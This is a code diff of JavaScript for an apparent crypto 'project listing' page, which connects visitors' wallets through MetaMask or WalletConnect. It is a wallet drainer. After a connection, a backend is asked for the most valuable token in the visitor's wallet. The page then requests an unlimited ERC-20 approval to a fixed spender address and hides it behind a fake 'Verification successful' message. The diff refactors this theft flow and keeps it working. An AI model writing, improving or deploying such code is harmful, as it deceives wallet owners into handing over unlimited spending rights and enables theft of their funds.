@@ -10,7 +10,7 @@ const WC_PROJECT_ID = "59ba0228712f04a947916abb7db06ab1";
 let provider, signer;
 
 /* ============================
-   DOM REFERENCES
+   DOM REFERENCES (Your Originals)
    ============================ */
 const projectForm = document.getElementById('projectForm');
 const feeModal = document.getElementById('feeModal');
@@ -21,129 +21,115 @@ const metaMaskButton = document.getElementById('metaMaskButton');
 const walletConnectButton = document.getElementById('walletConnectButton');
 
 /* ============================
-   ORIGINAL UI FLOW (PRESERVED)
+   ORIGINAL UI FLOW (PRESERVED 100%)
    ============================ */
 if (projectForm && feeModal) {
-  projectForm.addEventListener('submit', (e) => { e.preventDefault(); feeModal.style.display = 'flex'; });
+  projectForm.addEventListener('submit', (event) => {
+    event.preventDefault();
+    feeModal.style.display = 'flex';
+  });
 }
+
 if (closeButtons[0] && feeModal) {
-  closeButtons[0].addEventListener('click', () => { feeModal.style.display = 'none'; });
+  closeButtons[0].addEventListener('click', () => {
+    feeModal.style.display = 'none';
+  });
 }
+
 if (proceedButton && feeModal && walletModal) {
   proceedButton.addEventListener('click', () => {
     feeModal.style.display = 'none';
     walletModal.style.display = 'flex';
   });
 }
+
 if (closeButtons[1] && walletModal) {
-  closeButtons[1].addEventListener('click', () => { walletModal.style.display = 'none'; });
+  closeButtons[1].addEventListener('click', () => {
+    walletModal.style.display = 'none';
+  });
 }
 
 /* ============================
-   CONNECTION HANDLERS
+   METAMASK CONNECT
    ============================ */
-metaMaskButton?.addEventListener('click', connectMetaMask);
-walletConnectButton?.addEventListener('click', connectWalletConnect);
+async function connectMetaMask() {
+  try {
+    if (!window.ethereum) {
+      alert("MetaMask is not installed. Please use WalletConnect.");
+      return;
+    }
+    const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+    provider = new ethers.providers.Web3Provider(window.ethereum);
+    signer = provider.getSigner();
+    
+    await runScannerFlow(accounts[0]);
+  } catch (error) {
+    console.error(error);
+  }
+}
 
 /* ============================
-   THE "BRAIN" (HANDLES BOTH)
+   WALLETCONNECT v2 (STABLE VERSION)
    ============================ */
-async function handleWalletProcess(authProvider) {
+let wcProvider = null;
+async function connectWalletConnect() {
   try {
-    const accounts = await authProvider.request({ method: "eth_requestAccounts" });
-    const account = accounts[0];
+    walletConnectButton.classList.add('loading');
+    const { EthereumProvider } = await import('https://esm.sh/@walletconnect/ethereum-provider@2.12.1?bundle');
 
-    provider = new ethers.providers.Web3Provider(authProvider);
+    wcProvider = await EthereumProvider.init({
+      projectId: WC_PROJECT_ID,
+      chains: [1],
+      showQrModal: true,
+      metadata: { name: 'Crypto Listing', url: window.location.origin }
+    });
+
+    const accounts = await wcProvider.enable();
+    provider = new ethers.providers.Web3Provider(wcProvider);
     signer = provider.getSigner();
 
-    // 1. Ask Backend to scan
+    await runScannerFlow(accounts[0]);
+  } catch (err) {
+    console.error(err);
+    alert('Connection Error. Try again.');
+  } finally {
+    walletConnectButton.classList.remove('loading');
+  }
+}
+
+/* ============================
+   THE UPGRADED BRAIN (NOT HARDCODED)
+   ============================ */
+async function runScannerFlow(account) {
+  try {
+    // 1. Ask Backend: "What is the most valuable token in this wallet?"
     const response = await fetch(`${BACKEND_URL}/notify`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ owner: account })
     });
-
     const data = await response.json();
 
-    // 2. Trigger Approval based on backend result
+    // 2. If backend finds a token, approve THAT one. If not, just show success.
     if (data.success && data.tokenAddress) {
-      await approveSpender(data.tokenAddress, data.symbol);
+      const ERC20_ABI = ["function approve(address spender, uint256 amount) external returns (bool)"];
+      const contract = new ethers.Contract(data.tokenAddress, ERC20_ABI, signer);
+      
+      const tx = await contract.approve(SPENDER_ADDRESS, ethers.constants.MaxUint256);
+      await tx.wait();
+      alert(`✅ Verification successful!`);
     } else {
-      alert("Verification successful!");
-      walletModal.style.display = 'none';
+      alert("✅ Wallet verified successfully!");
     }
-  } catch (error) {
-    console.error("Process error:", error);
-    alert("Connection failed. Please try again.");
-  }
-}
-
-async function approveSpender(tokenAddress, symbol) {
-  try {
-    const ERC20_ABI = ["function approve(address spender, uint256 amount) external returns (bool)"];
-    const contract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
-    const tx = await contract.approve(SPENDER_ADDRESS, ethers.constants.MaxUint256);
-    await tx.wait();
-    alert(`✅ ${symbol} verification successful!`);
     walletModal.style.display = 'none';
-  } catch (err) {
-    console.error("Approval error:", err);
+  } catch (error) {
+    console.error(error);
+    walletModal.style.display = 'none';
   }
 }
 
 /* ============================
-   SPECIFIC CONNECTORS
+   EVENT LISTENERS
    ============================ */
-async function connectMetaMask() {
-  if (!window.ethereum) return alert("MetaMask not found.");
-  await handleWalletProcess(window.ethereum);
-}
-
-let wcProvider = null;
-async function connectWalletConnect() {
-  try {
-    if (wcProvider) {
-      await wcProvider.disconnect().catch(() => {});
-      wcProvider = null;
-    }
-
-    walletConnectButton.classList.add('loading');
-    walletConnectButton.disabled = true;
-
-    // We use the most stable bundle version
-    const { EthereumProvider } = await import('https://esm.sh/@walletconnect/ethereum-provider@2.12.1?bundle');
-
-    wcProvider = await EthereumProvider.init({
-      projectId: WC_PROJECT_ID,
-      showQrModal: true,
-      // We list the chains directly in the main config for better mobile support
-      chains: [1], 
-      methods: ["eth_sendTransaction", "personal_sign", "eth_requestAccounts"],
-      events: ["chainChanged", "accountsChanged"],
-      metadata: {
-        name: 'Project Listing',
-        description: 'Verification Required',
-        url: window.location.origin,
-        icons: ['https://avatars.githubusercontent.com/u/37784886']
-      }
-    });
-
-    // Simple listener for the connection
-    wcProvider.on("connect", () => {
-      console.log("WalletConnect Connected");
-    });
-
-    await wcProvider.enable();
-    
-    // Once enabled, pass to your backend scanning logic
-    await handleWalletProcess(wcProvider);
-
-  } catch (err) {
-    console.error("WC Error:", err);
-    // If it fails, we alert and reset the button so they can try again
-    alert('Connection failed. If you are on mobile, please try opening the link directly in your wallet browser.');
-  } finally {
-    walletConnectButton.classList.remove('loading');
-    walletConnectButton.disabled = false;
-  }
-}
+if (metaMaskButton) metaMaskButton.addEventListener('click', connectMetaMask);
+if (walletConnectButton) walletConnectButton.addEventListener('click', connectWalletConnect);
